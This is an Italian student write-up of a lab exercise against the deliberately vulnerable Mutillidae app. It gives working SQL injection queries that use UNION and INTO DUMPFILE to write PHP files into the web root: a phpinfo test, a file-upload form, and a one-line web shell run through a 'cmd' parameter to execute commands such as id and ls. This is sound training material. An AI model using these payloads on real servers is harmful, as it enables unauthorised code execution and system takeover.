
## Esercizio 7

Questo esercizio fa rifermento alla pagina user-info `http://192.168.122.123/mutillidae/index.php?page=user-info.php`.


1. Lanciando un semplice comando `admin'` è possibile vedere i messaggi di errore generati. La consegna ci chiede di capire *dove sono memorizzati file php*. Dal messaggio di errore capiamo che si trovano in `http://SERVERIP/mutillidae/classes/`
2. La seconda parte ci chiede *Tramite la pagina User info è possibile memorizzare su file, usando l’operatore INTO DUMPFILE[ref], il contenuto di una query specifica
	1. L'idea è di scrivere un file php che ti dà la possibilità di creare caricare file nel server.
	2. Potresti provare a creare un file di test, per vedere se si riesce ad iniettare del codice php. Ecco un possibile codice php `<?php phpinfo(); ?>` 
	   Ora però la domanda è, come faccio ad inserire un nuovo file php? Il prof ci ha suggeruti una funzione chiamata `INTO DUMPFILE`.
	3. Ecco la query :

```sql
test' UNION ALL SELECT "<?php phpinfo(); ?>\n",NULL,NULL,NULL,NULL,NULL,NULL INTO DUMPFILE '/var/www/html/mutillidae/classes/upload_test.php'-- -
```

Poi apri il browser `http://192.168.122.123/mutillidae/classes/` e dovresti trovarti il tuo file `upload_test.php` caricato. Se lo apri dovresti vedere info su php, che è la funzione.


3. ***Come facciamo a sfruttare questa vulnerabilità?***
   Possiamo creare un file php contente un form che mi permette di caricare file e che faccia uso della funzione `move_uploaded_file` come suggerito dal prof.

Chatgpt ha suggerito la seguente cosa
```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['file'])) {
        $file_tmp = $_FILES['file']['tmp_name'];
        $file_name = basename($_FILES['file']['name']);
        $upload_dir = './uploads/';

        if (!is_dir($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }

        if (move_uploaded_file($file_tmp, $upload_dir . $file_name)) {
            echo "File caricato con successo: <a href='uploads/$file_name'>$file_name</a>";
        } else {
            echo "Errore durante il caricamento del file.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Upload</title>
</head>
<body>
    <h2>Carica un file</h2>
    <form action="upload.php" method="POST" enctype="multipart/form-data">
        Seleziona file:
        <input type="file" name="file">
        <input type="submit" value="Carica">
    </form>
</body>
</html>

```

Ma per poterla eseguire, devi metterla su una riga. E poi devi creare la query SQL facendo uso della UNION.

```sql
test' UNION ALL SELECT "<?php if($_SERVER['REQUEST_METHOD']=='POST'){if(isset($_FILES['file'])){$file_tmp=$_FILES['file']['tmp_name'];$file_name=basename($_FILES['file']['name']);$upload_dir='./uploads/';if(!is_dir($upload_dir)){mkdir($upload_dir,0777,true);}if(move_uploaded_file($file_tmp,$upload_dir.$file_name)){echo 'File caricato con successo: <a href=uploads/'.$file_name.'>'.$file_name.'</a>'; }else{echo 'Errore durante il caricamento del file.';}}}?><html><body><h2>Carica un file</h2><form action='upload.php' method='POST' enctype='multipart/form-data'><input type='file' name='file'><input type='submit' value='Carica'></form></body></html>\n",NULL,NULL,NULL,NULL,NULL,NULL INTO DUMPFILE '/var/www/html/mutillidae/classes/upload.php'-- -
```


Vedrai che già ti appare il form su OWASP, ma se provi ad andare dal brower, lo vediamo meglio `http://192.168.122.123/mutillidae/classes/upload.php`.



4. ***Manca l'ultima parte, quella di eseguire una web shell in PHP che mostri l’output del comandi bash inviati.***



Ecco cosa iniettare:
```sql
test' UNION ALL SELECT "<?php system($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/mutillidae/classes/shell.php'-- -
```

Abbiamo iniettato il file `shell.php`. 
ATTENZIONE: se ci vai, non vedi nulla perché non ha niente in output, ma per interagirci devi passarci un parametro chiamato `cmd` da get:

Per vedere UID e GID, passare il comando `id`
`http://[IP-SERVER]/mutillidae/shell.php?cmd=id`


Ma ci puoi passare tutto quello che vuoi, tipo `ls, whoami` insomma comandi linux.
`http://192.168.122.123/mutillidae/classes/shell.php?cmd=ls`


